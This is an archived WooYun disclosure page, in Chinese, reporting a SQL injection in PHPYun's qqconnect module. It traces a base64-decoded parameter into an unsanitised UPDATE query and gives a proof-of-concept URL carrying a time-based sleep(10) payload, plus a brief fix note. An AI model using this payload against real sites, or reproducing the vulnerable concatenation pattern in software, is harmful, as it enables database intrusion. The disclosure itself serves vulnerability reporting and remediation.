@@ -1,0 +1,238 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpyun另一枚SQL注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpyun另一枚SQL注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-11-18 14:28</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-21：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-08：	细节向普通白帽子公开<br/>
+									2013-12-28：	细节向实习白帽子公开<br/>
+									2014-02-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">问题很类似，官方安全意识有待加强</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出现在/model/qqconnect.class.php的mcert_action函数中：<br />
+<br />
+</p><pre><code>function mcert_action(){<br />
+    	        $id=$_GET[&#039;id&#039;];<br />
+		$arr=@explode(&quot;|&quot;,base64_decode($id));<br />
+		if($id &amp;&amp; is_array($arr) &amp;&amp; $arr[0] &amp;&amp; $arr[2]==$this-&gt;config[&#039;coding&#039;]){<br />
+			$nid=$this-&gt;obj-&gt;DB_update_all(&quot;member&quot;,&quot;`email_status`=&#039;1&#039;&quot;,&quot;`uid`=&#039;&quot;.$arr[0].&quot;&#039;&quot;);<br />
+ 			$nid?$this-&gt;obj-&gt;ACT_msg($this-&gt;config[&#039;sy_weburl&#039;].&quot;/index.php?M=login&amp;usertype=1&quot;,&quot;激活成功&quot;):$this-&gt;obj-&gt;ACT_msg($this-&gt;config[&#039;sy_weburl&#039;],&quot;激活失败，联系管理员认证&quot;);<br />
+		}else{<br />
+			$this-&gt;obj-&gt;ACT_msg($this-&gt;config[&#039;sy_weburl&#039;],&quot;非法操作！&quot;,&quot;2&quot;);<br />
+		}<br />
+    }</code></pre><p class='detail'><br />
+<br />
+id从$_GET[&#039;id&#039;]参数中取出然后经过了base64解码并分隔进入数组$arr，由于是base64解码所以绕过前端过滤：<br />
+<br />
+</p><pre><code>$id=$_GET[&#039;id&#039;];<br />
+$arr=@explode(&quot;|&quot;,base64_decode($id));</code></pre><p class='detail'><br />
+<br />
+然后经过一段判断：<br />
+<br />
+</p><pre><code>if($id &amp;&amp; is_array($arr) &amp;&amp; $arr[0] &amp;&amp; $arr[2]==$this-&gt;config[&#039;coding&#039;])</code></pre><p class='detail'><br />
+<br />
+$this-&gt;config[&#039;coding&#039;]默认为null，所以只需要保证$arr[2]也为null的话这个判断就可以通过，判断通过后进入以下语句：<br />
+<br />
+</p><pre><code>$nid=$this-&gt;obj-&gt;DB_update_all(&quot;member&quot;,&quot;`email_status`=&#039;1&#039;&quot;,&quot;`uid`=&#039;&quot;.$arr[0].&quot;&#039;&quot;);</code></pre><p class='detail'><br />
+<br />
+跟进DB_update_all:<br />
+<br />
+</p><pre><code>function DB_update_all($tablename, $value, $where = 1) {<br />
+	    $SQL = &quot;UPDATE `&quot; . $this-&gt;def . $tablename . &quot;` SET &quot;.$value.&quot; WHERE &quot;.$where;  <br />
+		$this-&gt;db-&gt;query(&quot;set sql_mode=&#039;&#039;&quot;);<br />
+		$return=$this-&gt;db-&gt;query($SQL);<br />
+		return $return;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+跟进query:<br />
+<br />
+</p><pre><code>/*数据库执行语句，可执行查询添加修改删除等任何sql语句*/<br />
+	public function query($sql) {<br />
+<br />
+		if ($sql == &quot;&quot;) {<br />
+			$this-&gt;show_error(&quot;SQL语句错误：&quot;, &quot;SQL查询语句为空&quot;);<br />
+		}<br />
+		$this-&gt;sql = $sql;<br />
+<br />
+		$result = mysql_query($this-&gt;sql, $this-&gt;conn);<br />
+<br />
+		if (!$result) {<br />
+			//调试中使用，sql语句出错时会自动打印出来<br />
+			if ($this-&gt;show_error) {<br />
+				$this-&gt;show_error(&quot;错误SQL语句：&quot;, $this-&gt;sql);<br />
+			}<br />
+		} else {<br />
+			$this-&gt;result = $result;<br />
+		}<br />
+		if(1==1){<br />
+			global $starttime;<br />
+			$dbbug_error2[]=&quot;&lt;br&gt;&quot;;<br />
+			$dbbug_error2[sql]=$this-&gt;sql.&quot;&lt;br&gt;&quot;;<br />
+			$dbbug_error2[&quot;time&quot;]=$this-&gt;getmicrotime()-$starttime.&quot;&lt;br&gt;&quot;;<br />
+			//$dbbug_error2[]=&quot;&lt;br&gt;&quot;;<br />
+			//print_r($dbbug_error2);//查看sql语句<br />
+			$this-&gt;debug=$dbbug_error;<br />
+		}<br />
+		return $this-&gt;result;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+注入发生 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">提交<br />
+<br />
+</p><pre><code>http://www.target.com/index.php?M=qqconnect&amp;C=mcert&amp;id=JyBvciBzbGVlcCgxMCk7I3x6dHo%3D</code></pre><p class='detail'><br />
+<br />
+后台会执行sleep(10)<br />
+<br />
+</p><pre><code>UPDATE `phpyun_member` SET `email_status`=&#039;1&#039; WHERE `uid`=&#039;&#039; or sleep(10);#</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对base64解码的内容进行过滤和检查 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043236" title="phpyun另一枚SQL注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-11-18 15:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您的提供！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43236";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
